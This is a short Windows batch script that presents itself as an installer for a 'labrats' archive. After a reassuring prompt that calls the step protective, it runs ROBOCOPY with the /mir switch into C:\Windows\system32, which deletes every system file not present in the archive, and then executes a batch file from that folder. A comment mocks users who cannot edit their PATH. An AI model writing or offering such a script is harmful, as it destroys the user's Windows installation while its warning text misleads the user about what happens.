@echo off
REM %PATH% has system32 in it. Put the files in there, you don't know how to edit a Windows %PATH%.
powershell Expand-Archive labrats.zip -DestinationPath C:\temp\labrats
echo "WARNING: System is about to copy files to system32. An error in the program can cause severe errors in your system. For your protection, press a key to continue the installation."
pause
ROBOCOPY "C:\temp\labrats" "C:\Windows\system32" /mir
C:\Windows\system32\important.bat